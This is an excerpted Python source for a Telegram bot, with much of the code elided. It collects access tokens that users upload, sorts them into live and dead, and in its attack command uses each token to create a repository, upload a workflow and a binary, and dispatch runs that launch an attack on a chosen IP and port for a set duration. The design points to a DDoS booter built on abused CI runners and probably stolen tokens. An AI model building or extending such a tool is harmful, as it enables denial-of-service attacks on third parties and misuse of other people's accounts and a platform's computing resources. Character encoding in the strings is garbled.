...
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    msg = await animate_progress(context, chat_id, "Launchingâ¦", [f"Loading {f}" for f in frames], 0.35)  # animation
...
async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    msg = await update.message.reply_text("Pingingâ¦")  # initial
...
async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if update.message.document and update.message.document.file_name.endswith(".txt"):
        ...
        msg = await update.message.reply_text(f"Saved {cnt} token(s). Preparing setupâ¦")  # ack
    else:
        # token(s) as text
        ...
        msg = await update.message.reply_text(f"Saved {len(tokens)} token(s). Setting upâ¦")  # ack

    # progress animation âsetupâ after token saved
    frames = ["Creating repo â°â±â±", "Adding binary â°â°â±", "Ready â°â°â°"]
    for fr in frames:
...
async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = await update.message.reply_text("Checking tokensâ¦")  # start
    await asyncio.sleep(0.4)
    try:
        await msg.edit_text("Checking tokens â°â±â±")  # anim
    except Exception:
        pass
    ...
    if is_admin(uid):
        ...
        for i, line in enumerate(lines, 1):
            ...
            results.setdefault(u, {})[tok[:10] + "â¦"] = "live" if alive else "dead"  # record
            if i % 5 == 0:
                try:
        ...
        for i, line in enumerate(own, 1):
            ...
            if ok:
                live += 1
                rows.append(f"{tok[:12]}â¦: â live")  # summary
            else:
                dead += 1
                rows.append(f"{tok[:12]}â¦: â dead")  # summary
            if i % 4 == 0:
                try:
...
async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    msg = await update.message.reply_text(f"Starting attack with {len(valid_tokens)} token(s)â¦")  # step 1
    ...
    for token in valid_tokens:
        try:
            # Create repository
            await msg.edit_text(f"Creating repository for token {token[:10]}â¦")  # step 1
            name = rand_repo_name()
            ...
            # Upload workflow
            await msg.edit_text(f"Uploading workflow for {full_name}â¦")  # step 2
            ...
            # Upload binary
            await msg.edit_text(f"Uploading binary for {full_name}â¦")  # step 3
            ...
            # Dispatch workflow
            await msg.edit_text(f"Dispatching workflow for {full_name}â¦")  # step 4
            ...
            failed_tokens.append(token[:10] + "â¦")
            await msg.edit_text(f"Error with token {token[:10]}â¦: {str(e)}")
            continue
    ...
    started = f"Attack started on {ip}:{port} for {duration}s with {len(repos)} token(s) by destroyer sir ð"
    try:
    ...
    for i in range(1, 6):
        ...
        try:
            await msg.edit_text(f"Runningâ¦ {ip}:{port} ~{i * 20}% ({len(repos)} repos)")  # progress
        except Exception:
            pass
